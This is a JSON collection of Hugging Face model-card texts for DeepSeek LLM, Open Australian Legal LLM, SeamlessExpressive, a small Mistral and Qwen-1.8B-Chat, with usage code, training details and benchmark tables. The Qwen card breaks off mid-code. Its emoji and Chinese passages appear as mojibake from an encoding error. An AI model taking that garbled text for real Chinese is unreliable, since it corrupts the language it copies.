{
    "deepseek-ai/deepseek-llm-7b-base": "1. Introduction of Deepseek LLM\n2. Model Summary\n3. How to Use\nText Completion\n4. License\n5. Contact\n[ğŸ Homepage]  |  [ğŸ¤– Chat with DeepSeek LLM]  |  [Discord]  |  [Wechat(å¾®ä¿¡)]\n1. Introduction of Deepseek LLM\nIntroducing DeepSeek LLM, an advanced language model comprising 7 billion parameters. It has been trained from scratch on a vast dataset of 2 trillion tokens in both English and Chinese. In order to foster research, we have made DeepSeek LLM 7B/67B Base and DeepSeek LLM 7B/67B Chat open source for the research community.\n2. Model Summary\ndeepseek-llm-7b-base is a 7B parameter model with Multi-Head Attention trained on 2 trillion tokens from scratch.\nHome Page: DeepSeek\nRepository: deepseek-ai/deepseek-LLM\nChat With DeepSeek LLM: DeepSeek-LLM\n3. How to Use\nHere give some examples of how to use our model.\nText Completion\nimport torch\nfrom transformers import AutoTokenizer, AutoModelForCausalLM, GenerationConfig\nmodel_name = \"deepseek-ai/deepseek-llm-7b-base\"\ntokenizer = AutoTokenizer.from_pretrained(model_name)\nmodel = AutoModelForCausalLM.from_pretrained(model_name, torch_dtype=torch.bfloat16, device_map=\"auto\")\nmodel.generation_config = GenerationConfig.from_pretrained(model_name)\nmodel.generation_config.pad_token_id = model.generation_config.eos_token_id\ntext = \"An attention function can be described as mapping a query and a set of key-value pairs to an output, where the query, keys, values, and output are all vectors. The output is\"\ninputs = tokenizer(text, return_tensors=\"pt\")\noutputs = model.generate(**inputs.to(model.device), max_new_tokens=100)\nresult = tokenizer.decode(outputs[0], skip_special_tokens=True)\nprint(result)\n4. License\nThis code repository is licensed under the MIT License. The use of DeepSeek LLM models is subject to the Model License. DeepSeek LLM supports commercial use.\nSee the LICENSE-MODEL for more details.\n5. Contact\nIf you have any questions, please raise an issue or contact us at service@deepseek.com.",
    "deepseek-ai/deepseek-llm-67b-chat": "1. Introduction of Deepseek LLM\n2. Model Summary\n3. How to Use\nChat Completion\n4. License\n5. Contact\n[ğŸ Homepage]  |  [ğŸ¤– Chat with DeepSeek LLM]  |  [Discord]  |  [Wechat(å¾®ä¿¡)]\n1. Introduction of Deepseek LLM\nIntroducing DeepSeek LLM, an advanced language model comprising 67 billion parameters. It has been trained from scratch on a vast dataset of 2 trillion tokens in both English and Chinese. In order to foster research, we have made DeepSeek LLM 7B/67B Base and DeepSeek LLM 7B/67B Chat open source for the research community.\n2. Model Summary\ndeepseek-llm-67b-chat is a 67B parameter model initialized from deepseek-llm-67b-base and fine-tuned on extra instruction data.\nHome Page: DeepSeek\nRepository: deepseek-ai/deepseek-LLM\nChat With DeepSeek LLM: DeepSeek-LLM\n3. How to Use\nHere give some examples of how to use our model.\nChat Completion\nimport torch\nfrom transformers import AutoTokenizer, AutoModelForCausalLM, GenerationConfig\nmodel_name = \"deepseek-ai/deepseek-llm-67b-chat\"\ntokenizer = AutoTokenizer.from_pretrained(model_name)\nmodel = AutoModelForCausalLM.from_pretrained(model_name, torch_dtype=torch.bfloat16, device_map=\"auto\")\nmodel.generation_config = GenerationConfig.from_pretrained(model_name)\nmodel.generation_config.pad_token_id = model.generation_config.eos_token_id\nmessages = [\n{\"role\": \"user\", \"content\": \"Who are you?\"}\n]\ninput_tensor = tokenizer.apply_chat_template(messages, add_generation_prompt=True, return_tensors=\"pt\")\noutputs = model.generate(input_tensor.to(model.device), max_new_tokens=100)\nresult = tokenizer.decode(outputs[0][input_tensor.shape[1]:], skip_special_tokens=True)\nprint(result)\nAvoiding the use of the provided function apply_chat_template, you can also interact with our model following the sample template. Note that messages should be replaced by your input.\nUser: {messages[0]['content']}\nAssistant: {messages[1]['content']}<ï½œendâ–ofâ–sentenceï½œ>User: {messages[2]['content']}\nAssistant:\nNote: By default (add_special_tokens=True), our tokenizer automatically adds a bos_token (<ï½œbeginâ–ofâ–sentenceï½œ>) before the input text. Additionally, since the system prompt is not compatible with this version of our models, we DO NOT RECOMMEND including the system prompt in your input.\n4. License\nThis code repository is licensed under the MIT License. The use of DeepSeek LLM models is subject to the Model License. DeepSeek LLM supports commercial use.\nSee the LICENSE-MODEL for more details.\n5. Contact\nIf you have any questions, please raise an issue or contact us at service@deepseek.com.",
    "isaacus/open-australian-legal-llm": "Open Australian Legal LLM â€âš–ï¸\nUsage ğŸ‘©â€ğŸ’»\nCreation ğŸ§ª\nBenchmarks ğŸ“Š\nLimitations ğŸš§\nLicence ğŸ“œ\nCitation ğŸ”–\nAcknowledgements ğŸ™\nOpen Australian Legal LLM â€âš–ï¸\nThe Open Australian Legal LLM is the largest open source language model trained on Australian law.\nWith over 1.5 billion parameters, the model's size and the richness and quality of its training data, comprising roughly 70,000 laws, regulations and decisions across six Australian jurisdictions from the Open Australian Legal Corpus, make it well suited for finetuning on a diverse range of downstream natural language processing tasks applied to the Australian legal domain, including text generation, text completion and question answering.\nTo ensure its accessibility to as wide an audience as possible, the model is issued under the Apache Licence 2.0.\nUsage ğŸ‘©â€ğŸ’»\nThe code snippet below demonstrates just one of the many ways in which the model may be accessed:\n>>> from transformers import pipeline, set_seed\n>>> set_seed(42) # We set a seed for reproducibility.\n>>> generator = pipeline('text-generation', model='umarbutler/open-australian-legal-llm')\n>>> response = generator('Section 51 of the Constitution provides', max_length=55)\n>>> print(response[0]['generated_text'])\nCreation ğŸ§ª\nThe following cleaning procedures were applied to all 218,340 laws, regulations and decisions in version 4.2.0 of the Open Australian Legal Corpus:\nNon-breaking spaces were replaced with regular spaces;\nReturn carriages followed by newlines were replaced with newlines;\nWhitespace was removed from lines comprised entirely of whitespace;\nNewlines and whitespace preceding newlines were removed from the end of texts;\nNewlines and whitespace succeeding newlines were removed from the beginning of texts; and\nSpaces and tabs were removed from the end of lines.\nAfter cleaning, texts with less than 128 characters and those with duplicate XXH3 128-bit hashes were removed, leaving 218,207 documents. These documents were then used to pretrain a GPT2-like tokenizer, after which they were split into blocks 512-tokens-long, with the tokenizer's end-of-sequence token ('<|endoftext|>') being used as a delimiter as well as to pad the end of the final block. An attention mask was applied to the end-of-sequence tokens used as padding, barring the first such token. The resulting blocks were subsequently randomly shuffled and split into a training dataset of 1,966,867 chunks and a validation dataset of 218,541.\nGPT2-XL was used as a base model. Input embeddings for tokens shared between the vocabulary trained on the Corpus and that of GPT2 were preserved but moved to their new positions. Embeddings for unique tokens were set to the average embedding weights.\nThe model was trained with the following hyperparameters for the first 100,290 steps:\nHyperparameter\nValue\nSequence length\n512\nEpochs\n1\nOptimiser\nAdamW\nLearning rate\n1e-4\nLearning rate scheduler\nLinear with warmup\nBatch size\n6\nWeight decay\n0.01\nWarmup ratio\n0.06\nAfter training on two RTX A6000s for ~120,050 steps over a period of 91 hours, the vast.ai instance hosting the model crashed. Fortunately, a checkpoint had been saved at step 100,290 (~60% of an epoch), although the optimiser's state was mistakenly not downloaded. The model was subsequently moved to a new instance where it was trained on an L40 for a further 133,711 steps (~40% of an epoch) with the following hyperparameters (changes emphasised):\nHyperparameter\nValue\nSequence length\n512\nEpochs\n1\nOptimiser\nAdamW\nLearning rate\n4.255e-5\nLearning rate scheduler\nLinear\nBatch size\n3\nWeight decay\n0.01\nWarmup ratio\n0.00\nNaturally, as the optimiser state had been lost, the model's learning rate descended slower than it had been previously. Nevertheless, after completing an epoch of training, the model was able to achieve a validation loss of 2.04.\nBenchmarks ğŸ“Š\nTested against version 2.0.0 of the Open Australian Legal QA dataset, the model achieved a perplexity of 8.01, outperforming all known language models for Australian law.\nModel\nParameters\nPerplexity\nOpen Australian Legal LLM\n1.5B\n8.01\nOpen Australian Legal Phi 1.5\n1.3B\n8.69\nOpen Australian Legal GPT2\n124M\n16.37\nOpen Australian Legal DistilGPT2\n88.2M\n23.9\nLimitations ğŸš§\nAlthough the model has not been tested for bias, one would expect it to exhibit much of the same, if not all, the biases of GPT2-XL.\nOne might also expect the model to exhibit a bias towards the type of language employed in laws, regulations and decisions (its source material) as well as towards Commonwealth and New South Wales law (the largest sources of documents in the Open Australian Legal Corpus at the time of the model's creation).\nFinally, it is worth noting that the model may lack knowledge of Victorian, Northern Territory and Australian Capital Territory law as licensing restrictions had prevented their inclusion in the training data.\nLicence ğŸ“œ\nTo ensure its accessibility to as wide an audience as possible, the model is issued under the Apache Licence 2.0.\nCitation ğŸ”–\nIf you've relied on the model for your work, please cite:\n@misc{butler-2023-open-australian-legal-llm,\nauthor = {Butler, Umar},\nyear = {2023},\ntitle = {Open Australian Legal LLM},\npublisher = {Hugging Face},\nversion = {1.0.0},\nurl = {https://huggingface.co/datasets/umarbutler/open-australian-legal-llm}\n}\nAcknowledgements ğŸ™\nIn the spirit of reconciliation, the author acknowledges the Traditional Custodians of Country throughout Australia and their connections to land, sea and community. He pays his respect to their Elders past and present and extends that respect to all Aboriginal and Torres Strait Islander peoples today.\nThe author thanks the sources of the Open Australian Legal Corpus for making their data available under open licences.\nThe author also acknowledges the developers of the many Python libraries relied upon in the training of the model, as well as the makers of GPT2, which the model was built atop.\nFinally, the author is eternally grateful for the endless support of his wife and her willingness to put up with many a late night spent writing code and quashing bugs.",
    "facebook/seamless-expressive": "You need to agree to share your contact information to access this model\nThis repository is publicly accessible, but\nyou have to accept the conditions to access its files and content.\nAccess SeamlessExpressive on Hugging Face\nTo access SeamlessExpressive on Hugging Face:\nPlease fill out the Meta request form and accept the license terms and acceptable policy BEFORE submitting this form. Requests will be processed in 1-2 days.\nSubmit this form on Hugging Face afterwards.Your Hugging Face account email address MUST match the email you provide on the Meta website, or your request will not be approved.\nLog in\nor\nSign Up\nto review the conditions and access this model content.\nSeamlessExpressive\nProsody UnitY2\nPRETSSEL\nRunning inference\nBenchmark Datasets\nmExpresso (Multilingual Expresso)\nStatistics of mExpresso\nCreate mExpresso S2T dataset by downloading and combining with English Expresso\nAutomatic evaluation\nEvaluation results: mExpresso\nStep-by-step evaluation\nSeamlessExpressive\nSeamlessExpressive model consists of two main modules: (1) Prosody UnitY2, which is a prosody-aware speech-to-unit translation model based on UnitY2 architecture; and (2) PRETSSEL, which is a unit-to-speech model featuring cross-lingual expressivity preservation.\nProsody UnitY2\nProsody UnitY2 is an expressive speech-to-unit translation model, injecting expressivity embedding from PRETSSEL into the unit generation. It could transfer phrase-level prosody such as speech rate or pauses.\nPRETSSEL\nParalinguistic REpresentation-based\nTextleSS acoustic modEL (PRETSSEL) is an expressive unit-to-speech generator, and it can efficiently disentangle semantic and expressivity components from speech. It transfers utterance-level expressivity like the style of one's voice.\nRunning inference\nBelow is the script for efficient batched inference.\nexport MODEL_DIR=\"/path/to/SeamlessExpressive/model\"\nexport TEST_SET_TSV=\"input.tsv\" # Your dataset in a TSV file, with headers \"id\", \"audio\"\nexport TGT_LANG=\"spa\" # Target language to translate into, options including \"fra\", \"deu\", \"eng\" (\"cmn\" and \"ita\" are experimental)\nexport OUTPUT_DIR=\"tmp/\" # Output directory for generated text/unit/waveform\nexport TGT_TEXT_COL=\"tgt_text\" # The column in your ${TEST_SET_TSV} for reference target text to calcuate BLEU score. You can skip this argument.\nexport DFACTOR=\"1.0\" # Duration factor for model inference to tune predicted duration (preddur=DFACTOR*preddur) per each position which affects output speech rate. Greater value means slower speech rate (default to 1.0). See expressive evaluation README for details on duration factor we used.\npython src/seamless_communication/cli/expressivity/evaluate/pretssel_inference.py \\\n${TEST_SET_TSV} --gated-model-dir ${MODEL_DIR} --task s2st --tgt_lang ${TGT_LANG}\\\n--audio_root_dir \"\" --output_path ${OUTPUT_DIR} --ref_field ${TGT_TEXT_COL} \\\n--model_name seamless_expressivity --vocoder_name vocoder_pretssel \\\n--text_unk_blocking True --duration_factor ${DFACTOR}\nBenchmark Datasets\nmExpresso (Multilingual Expresso)\nmExpresso is an expressive S2ST dataset that includes seven styles of read speech (i.e., default, happy, sad, confused, enunciated, whisper and laughing) between English and five other languages -- French, German, Italian, Mandarin and Spanish. We create the dataset by expanding a subset of read speech in Expresso Dataset. We first translate the English transcriptions into other languages, including the emphasis markers in the transcription, and then the gender matched bilingual speakers read the translation in the style suggested by the markers.\nWe are currently open source the text translation of the other language to enable evaluating English to other directions. We will open source the audio files in the near future.\nText translation in other languages can be Downloaded.\nStatistics of mExpresso\nlanguage pair\nsubset\n# items\nEnglish duration (hr)\n# speakers\neng-cmn\ndev\n2369\n2.1\n1\ntest\n5003\n4.8\n2\neng-deu\ndev\n4420\n3.9\n2\ntest\n5733\n5.6\n2\neng-fra\ndev\n4770\n4.2\n2\ntest\n5742\n5.6\n2\neng-ita\ndev\n4413\n3.9\n2\ntest\n5756\n5.7\n2\neng-spa\ndev\n4758\n4.2\n2\ntest\n5693\n5.5\n2\nCreate mExpresso S2T dataset by downloading and combining with English Expresso\nRun the following command to create English to other langauges speech-to-text dataset from scratch. It will first download the English Expresso dataset, downsample the audio to 16k Hz, and join with the text translation to form the manifest.\npython3 -m seamless_communication.cli.expressivity.data.prepare_mexpresso \\\n<OUTPUT_FOLDER>\nThe output manifest will be located at <OUTPUT_FOLDER>/{dev,test}_mexpresso_eng_{spa,fra,deu,ita,cmn}.tsv\nAutomatic evaluation\nPython package dependencies (on top of seamless_communication, coming from stopes pipelines):\nUnidecode\nscipy\nphonemizer\ns3prl\nsyllables\nipapy\npkuseg\nnltk\nfire\ninflect\npip install Unidecode scipy phonemizer s3prl syllables ipapy pkuseg nltk fire inflect\nAs described in Section 4.3 we use following automatic metrics:\nASR-BLEU: refer to /src/seamless_communication/cli/eval_utils to see how the OpenAI whisper ASR model is used to extract transcriptions from generated audios.\nVocal Style Similarity: refer to stopes/eval/vocal_style_similarity for implementation details.\nAutoPCP: refer to stopes/eval/auto_pcp for implementation details.\nPause and Rate scores: refer to stopes/eval/local_prosody for implementation details. Rate score corresponds to the syllable speech rate spearman correlation between source and predicted speech. Pause score corresponds to the weighted mean joint score produced by stopes/eval/local_prosody/compare_utterances.py script from stopes repo.\nEvaluation results: mExpresso\nPlease see mExpresso section on how to download evaluation data\nImportant Notes:\nWe used empirically chosen duration factors per each tgt language towards the best perceptual quality: 1.0 (default) for cmn, spa, ita; 1.1 for deu; 1.2 for fra. Same settings were used to report results in the \"Seamless: Multilingual Expressive and Streaming Speech Translation\" paper.\nResults here slightly differs from ones shown in the paper due to several descrepancies in the pipeline: results reported here use pipeline w/ fairseq2 backend for model's inference and pipeline includes watermarking.\nLanguage\nPartition\nASR-BLEU\nVocal Style Sim\nAutoPCP\nPause\nRate\neng_cmn\ndev\n26.080\n0.207\n3.168\n0.236\n0.538\neng_deu\ndev\n36.940\n0.261\n3.298\n0.319\n0.717\neng_fra\ndev\n37.780\n0.231\n3.285\n0.331\n0.682\neng_ita\ndev\n40.170\n0.226\n3.322\n0.388\n0.734\neng_spa\ndev\n42.400\n0.228\n3.379\n0.332\n0.702\neng_cmn\ntest\n23.320\n0.249\n2.984\n0.385\n0.522\neng_deu\ntest\n27.780\n0.290\n3.117\n0.483\n0.717\neng_fra\ntest\n38.360\n0.270\n3.117\n0.506\n0.663\neng_ita\ntest\n38.020\n0.274\n3.130\n0.523\n0.686\neng_spa\ntest\n42.920\n0.274\n3.183\n0.508\n0.675\nStep-by-step evaluation\nPre-requisite: all steps described here assume that the generation/inference has been completed following steps.\nFor stopes installation please refer to stopes/eval.\nThe resulting directory of generated outputs:\nexport SPLIT=\"dev_mexpresso_eng_spa\" # example, change for your split\nexport TGT_LANG=\"spa\"\nexport SRC_LANG=\"eng\"\nexport GENERATED_DIR=\"path_to_generated_output_for_given_data_split\"\nexport GENERATED_TSV=\"generate-${SPLIT}.tsv\"\nexport STOPES_ROOT=\"path_to_stopes_code_repo\"\nexport SC_ROOT=\"path_to_this_repo\"\nASR-BLEU evaluation\npython ${SC_ROOT}/src/seamless_communication/cli/expressivity/evaluate/run_asr_bleu.py \\\n--generation_dir_path=${GENERATED_DIR} \\\n--generate_tsv_filename=generate-${SPLIT}.tsv \\\n--tgt_lang=${TGT_LANG}\ngenerate-${SPLIT}.tsv is an expected output from inference described in pre-requisite\nAfter completion resulting ASR-BLEU score is written in ${GENERATED_DIR}/s2st_asr_bleu_normalized.json.\nVocal Style Similarity\nDownload & set WavLM finetuned ckpt path (${SPEECH_ENCODER_MODEL_PATH}) as described in stopes README to reproduce our vocal style similarity eval.\npython -m stopes.modules +vocal_style_similarity=base \\\nlauncher.cluster=local \\\nvocal_style_similarity.model_type=valle \\\n+vocal_style_similarity.model_path=${SPEECH_ENCODER_MODEL_PATH} \\\n+vocal_style_similarity.input_file=${GENERATED_DIR}/${GENERATED_TSV} \\\n+vocal_style_similarity.output_file=${GENERATED_DIR}/vocal_style_sim_result.txt \\\nvocal_style_similarity.named_columns=true \\\nvocal_style_similarity.src_audio_column=src_audio \\\nvocal_style_similarity.tgt_audio_column=hypo_audio\nWe report average number from all utterance scores written in ${GENERATED_DIR}/vocal_style_sim_result.txt.\nAutoPCP\npython -m stopes.modules +compare_audios=AutoPCP_multilingual_v2 \\\nlauncher.cluster=local \\\n+compare_audios.input_file=${GENERATED_DIR}/${GENERATED_TSV} \\\ncompare_audios.src_audio_column=src_audio \\\ncompare_audios.tgt_audio_column=hypo_audio \\\n+compare_audios.named_columns=true \\\n+compare_audios.output_file=${GENERATED_DIR}/autopcp_result.txt\nWe report average number from all utterance scores written in ${GENERATED_DIR}/autopcp_result.txt.\nPause and Rate\nThis stage includes 3 steps: (1) src lang annotation, (2) tgt lang annotation, (3) pairwise comparison\n# src lang pause&rate annotation\npython ${STOPES_ROOT}/stopes/eval/local_prosody/annotate_utterances.py \\\n+data_path=${GENERATED_DIR}/${GENERATED_TSV} \\\n+result_path=${GENERATED_DIR}/${SRC_LANG}_speech_rate_pause_annotation.tsv \\\n+audio_column=src_audio \\\n+text_column=src_text \\\n+speech_units=[syllable] \\\n+vad=true \\\n+net=true \\\n+lang=$SRC_LANG \\\n+forced_aligner=fairseq2_nar_t2u_aligner\n# tgt lang pause&rate annotation\npython ${STOPES_ROOT}/stopes/eval/local_prosody/annotate_utterances.py \\\n+data_path=${GENERATED_DIR}/${GENERATED_TSV} \\\n+result_path=${GENERATED_DIR}/${TGT_LANG}_speech_rate_pause_annotation.tsv \\\n+audio_column=hypo_audio \\\n+text_column=s2t_out \\\n+speech_units=[syllable] \\\n+vad=true \\\n+net=true \\\n+lang=$TGT_LANG \\\n+forced_aligner=fairseq2_nar_t2u_aligner\n# pair wise comparison\npython ${STOPES_ROOT}/stopes/eval/local_prosody/compare_utterances.py \\\n+src_path=${GENERATED_DIR}/${SRC_LANG}_speech_rate_pause_annotation.tsv \\\n+tgt_path=${GENERATED_DIR}/${TGT_LANG}_speech_rate_pause_annotation.tsv \\\n+result_path=${GENERATED_DIR}/${SRC_LANG}_${TGT_LANG}_pause_scores.tsv \\\n+pause_min_duration=0.1\nFor Rate reporting, please see the aggregation function get_rate in ${SC_ROOT}/src/seamless_communication/cli/expressivity/evaluate/post_process_pauserate.py;\nFor Pause reporting, please see the aggregation function get_pause in ${SC_ROOT}/src/seamless_communication/cli/expressivity/evaluate/post_process_pauserate.py.",
    "typeof/mistral-60m": "Training\nA mini (randomly initialized) mistral.\nTraining\nTrained on slimorca with chatml format.",
    "Qwen/Qwen-1_8B-Chat": "Qwen-1.8B-Chat\nä»‹ç»ï¼ˆIntroductionï¼‰\nè¦æ±‚ï¼ˆRequirementsï¼‰\nä¾èµ–é¡¹ï¼ˆDependencyï¼‰\nå¿«é€Ÿä½¿ç”¨ï¼ˆQuickstartï¼‰\nTokenizer\né‡åŒ– (Quantization)\nç”¨æ³• (Usage)\næ•ˆæœè¯„æµ‹\næ¨ç†é€Ÿåº¦ (Inference Speed)\næ˜¾å­˜ä½¿ç”¨ (GPU Memory Usage)\næ¨¡å‹ç»†èŠ‚ï¼ˆModelï¼‰\nè¯„æµ‹æ•ˆæœï¼ˆEvaluationï¼‰\nä¸­æ–‡è¯„æµ‹ï¼ˆChinese Evaluationï¼‰\nè‹±æ–‡è¯„æµ‹ï¼ˆEnglish Evaluationï¼‰\nä»£ç è¯„æµ‹ï¼ˆCoding Evaluationï¼‰\næ•°å­¦è¯„æµ‹ï¼ˆMathematics Evaluationï¼‰\nè¯„æµ‹å¤ç°ï¼ˆReproductionï¼‰\nFAQ\nå¼•ç”¨ (Citation)\nä½¿ç”¨åè®®ï¼ˆLicense Agreementï¼‰\nè”ç³»æˆ‘ä»¬ï¼ˆContact Usï¼‰\nQwen-1.8B-Chat\nğŸ¤— Hugging FaceÂ Â  | Â Â ğŸ¤– ModelScopeÂ Â  | Â Â  ğŸ“‘ Paper Â Â  ï½œ Â Â ğŸ–¥ï¸ Demo\nWeChat (å¾®ä¿¡)Â Â  | Â Â DiscordÂ Â  ï½œ  Â Â API\nä»‹ç»ï¼ˆIntroductionï¼‰\né€šä¹‰åƒé—®-1.8Bï¼ˆQwen-1.8Bï¼‰æ˜¯é˜¿é‡Œäº‘ç ”å‘çš„é€šä¹‰åƒé—®å¤§æ¨¡å‹ç³»åˆ—çš„18äº¿å‚æ•°è§„æ¨¡çš„æ¨¡å‹ã€‚Qwen-1.8Bæ˜¯åŸºäºTransformerçš„å¤§è¯­è¨€æ¨¡å‹, åœ¨è¶…å¤§è§„æ¨¡çš„é¢„è®­ç»ƒæ•°æ®ä¸Šè¿›è¡Œè®­ç»ƒå¾—åˆ°ã€‚é¢„è®­ç»ƒæ•°æ®ç±»å‹å¤šæ ·ï¼Œè¦†ç›–å¹¿æ³›ï¼ŒåŒ…æ‹¬å¤§é‡ç½‘ç»œæ–‡æœ¬ã€ä¸“ä¸šä¹¦ç±ã€ä»£ç ç­‰ã€‚åŒæ—¶ï¼Œåœ¨Qwen-1.8Bçš„åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬ä½¿ç”¨å¯¹é½æœºåˆ¶æ‰“é€ äº†åŸºäºå¤§è¯­è¨€æ¨¡å‹çš„AIåŠ©æ‰‹Qwen-1.8B-Chatã€‚æœ¬ä»“åº“ä¸ºQwen-1.8B-Chatçš„ä»“åº“ã€‚\né€šä¹‰åƒé—®-1.8Bï¼ˆQwen-1.8Bï¼‰ä¸»è¦æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š\nä½æˆæœ¬éƒ¨ç½²ï¼šæä¾›int8å’Œint4é‡åŒ–ç‰ˆæœ¬ï¼Œæ¨ç†æœ€ä½ä»…éœ€ä¸åˆ°2GBæ˜¾å­˜ï¼Œç”Ÿæˆ2048 tokensä»…éœ€3GBæ˜¾å­˜å ç”¨ã€‚å¾®è°ƒæœ€ä½ä»…éœ€6GBã€‚\nå¤§è§„æ¨¡é«˜è´¨é‡è®­ç»ƒè¯­æ–™ï¼šä½¿ç”¨è¶…è¿‡2.2ä¸‡äº¿tokensçš„æ•°æ®è¿›è¡Œé¢„è®­ç»ƒï¼ŒåŒ…å«é«˜è´¨é‡ä¸­ã€è‹±ã€å¤šè¯­è¨€ã€ä»£ç ã€æ•°å­¦ç­‰æ•°æ®ï¼Œæ¶µç›–é€šç”¨åŠä¸“ä¸šé¢†åŸŸçš„è®­ç»ƒè¯­æ–™ã€‚é€šè¿‡å¤§é‡å¯¹æ¯”å®éªŒå¯¹é¢„è®­ç»ƒè¯­æ–™åˆ†å¸ƒè¿›è¡Œäº†ä¼˜åŒ–ã€‚\nä¼˜ç§€çš„æ€§èƒ½ï¼šQwen-1.8Bæ”¯æŒ8192ä¸Šä¸‹æ–‡é•¿åº¦ï¼Œåœ¨å¤šä¸ªä¸­è‹±æ–‡ä¸‹æ¸¸è¯„æµ‹ä»»åŠ¡ä¸Šï¼ˆæ¶µç›–å¸¸è¯†æ¨ç†ã€ä»£ç ã€æ•°å­¦ã€ç¿»è¯‘ç­‰ï¼‰ï¼Œæ•ˆæœæ˜¾è‘—è¶…è¶Šç°æœ‰çš„ç›¸è¿‘è§„æ¨¡å¼€æºæ¨¡å‹ï¼Œå…·ä½“è¯„æµ‹ç»“æœè¯·è¯¦è§ä¸‹æ–‡ã€‚\nè¦†ç›–æ›´å…¨é¢çš„è¯è¡¨ï¼šç›¸æ¯”ç›®å‰ä»¥ä¸­è‹±è¯è¡¨ä¸ºä¸»çš„å¼€æºæ¨¡å‹ï¼ŒQwen-1.8Bä½¿ç”¨äº†çº¦15ä¸‡å¤§å°çš„è¯è¡¨ã€‚è¯¥è¯è¡¨å¯¹å¤šè¯­è¨€æ›´åŠ å‹å¥½ï¼Œæ–¹ä¾¿ç”¨æˆ·åœ¨ä¸æ‰©å±•è¯è¡¨çš„æƒ…å†µä¸‹å¯¹éƒ¨åˆ†è¯­ç§è¿›è¡Œèƒ½åŠ›å¢å¼ºå’Œæ‰©å±•ã€‚\nç³»ç»ŸæŒ‡ä»¤è·Ÿéšï¼šQwen-1.8B-Chatå¯ä»¥é€šè¿‡è°ƒæ•´ç³»ç»ŸæŒ‡ä»¤ï¼Œå®ç°è§’è‰²æ‰®æ¼”ï¼Œè¯­è¨€é£æ ¼è¿ç§»ï¼Œä»»åŠ¡è®¾å®šï¼Œå’Œè¡Œä¸ºè®¾å®šç­‰èƒ½åŠ›ã€‚\nå¦‚æœæ‚¨æƒ³äº†è§£æ›´å¤šå…³äºé€šä¹‰åƒé—®1.8Bå¼€æºæ¨¡å‹çš„ç»†èŠ‚ï¼Œæˆ‘ä»¬å»ºè®®æ‚¨å‚é˜…GitHubä»£ç åº“ã€‚\nQwen-1.8B is the 1.8B-parameter version of the large language model series, Qwen (abbr. Tongyi Qianwen), proposed by Aibaba Cloud. Qwen-1.8B is a Transformer-based large language model, which is pretrained on a large volume of data, including web texts, books, codes, etc. Additionally, based on the pretrained Qwen-1.8B, we release Qwen-1.8B-Chat, a large-model-based AI assistant, which is trained with alignment techniques. This repository is the one for Qwen-1.8B-Chat.\nThe features of Qwen-1.8B include:\nLow-cost deployment: We provide int4 and int8 quantized versions, the minimum memory requirment for inference is less than 2GB, generating 2048 tokens only 3GB of memory usage. The minimum memory requirment of finetuning is only 6GB.\nLarge-scale high-quality training corpora: It is pretrained on over 2.2 trillion tokens, including Chinese, English, multilingual texts, code, and mathematics, covering general and professional fields. The distribution of the pre-training corpus has been optimized through a large number of ablation experiments.\nGood performance: It supports 8192 context length and significantly surpasses existing open-source models of similar scale on multiple Chinese and English downstream evaluation tasks (including commonsense, reasoning, code, mathematics, etc.), and even surpasses some larger-scale models in several benchmarks. See below for specific evaluation results.\nMore comprehensive vocabulary coverage: Compared with other open-source models based on Chinese and English vocabularies, Qwen-1.8B uses a vocabulary of over 150K tokens. This vocabulary is more friendly to multiple languages, enabling users to directly further enhance the capability for certain languages without expanding the vocabulary.\nSystem prompt: Qwen-1.8B-Chat can realize roly playing, language style transfer, task setting, and behavior setting by using system prompt.\nFor more details about the open-source model of Qwen-1.8B-Chat, please refer to the GitHub code repository.\nè¦æ±‚ï¼ˆRequirementsï¼‰\npython 3.8åŠä»¥ä¸Šç‰ˆæœ¬\npytorch 1.12åŠä»¥ä¸Šç‰ˆæœ¬ï¼Œæ¨è2.0åŠä»¥ä¸Šç‰ˆæœ¬\nå»ºè®®ä½¿ç”¨CUDA 11.4åŠä»¥ä¸Šï¼ˆGPUç”¨æˆ·ã€flash-attentionç”¨æˆ·ç­‰éœ€è€ƒè™‘æ­¤é€‰é¡¹ï¼‰\npython 3.8 and above\npytorch 1.12 and above, 2.0 and above are recommended\nCUDA 11.4 and above are recommended (this is for GPU users, flash-attention users, etc.)\nä¾èµ–é¡¹ï¼ˆDependencyï¼‰\nè¿è¡ŒQwen-1.8B-Chatï¼Œè¯·ç¡®ä¿æ»¡è¶³ä¸Šè¿°è¦æ±‚ï¼Œå†æ‰§è¡Œä»¥ä¸‹pipå‘½ä»¤å®‰è£…ä¾èµ–åº“\nTo run Qwen-1.8B-Chat, please make sure you meet the above requirements, and then execute the following pip commands to install the dependent libraries.\npip install transformers==4.32.0 accelerate tiktoken einops scipy transformers_stream_generator==0.0.4 peft deepspeed\nå¦å¤–ï¼Œæ¨èå®‰è£…flash-attentionåº“ï¼ˆå½“å‰å·²æ”¯æŒflash attention 2ï¼‰ï¼Œä»¥å®ç°æ›´é«˜çš„æ•ˆç‡å’Œæ›´ä½çš„æ˜¾å­˜å ç”¨ã€‚\nIn addition, it is recommended to install the flash-attention library (we support flash attention 2 now.) for higher efficiency and lower memory usage.\ngit clone https://github.com/Dao-AILab/flash-attention\ncd flash-attention && pip install .\n# ä¸‹æ–¹å®‰è£…å¯é€‰ï¼Œå®‰è£…å¯èƒ½æ¯”è¾ƒç¼“æ…¢ã€‚\n# pip install csrc/layer_norm\n# pip install csrc/rotary\nå¿«é€Ÿä½¿ç”¨ï¼ˆQuickstartï¼‰\nä¸‹é¢æˆ‘ä»¬å±•ç¤ºäº†ä¸€ä¸ªä½¿ç”¨Qwen-1.8B-Chatæ¨¡å‹ï¼Œè¿›è¡Œå¤šè½®å¯¹è¯äº¤äº’çš„æ ·ä¾‹ï¼š\nWe show an example of multi-turn interaction with Qwen-1.8B-Chat in the following code:\nfrom transformers import AutoModelForCausalLM, AutoTokenizer\nfrom transformers.generation import GenerationConfig\n# Note: The default behavior now has injection attack prevention off.\ntokenizer = AutoTokenizer.from_pretrained(\"Qwen/Qwen-1_8B-Chat\", trust_remote_code=True)\n# use bf16\n# model = AutoModelForCausalLM.from_pretrained(\"Qwen/Qwen-1_8B-Chat\", device_map=\"auto\", trust_remote_code=True, bf16=True).eval()\n# use fp16\n# model = AutoModelForCausalLM.from_pretrained(\"Qwen/Qwen-1_8B-Chat\", device_map=\"auto\", trust_remote_code=True, fp16=True).eval()\n# use cpu only\n# model = AutoModelForCausalLM.from_pretrained(\"Qwen/Qwen-1_8B-Chat\", device_map=\"cpu\", trust_remote_code=True).eval()\n# use auto mode, automatically select precision based on the device.\nmodel = AutoModelForCausalLM.from_pretrained(\"Qwen/Qwen-1_8B-Chat\", 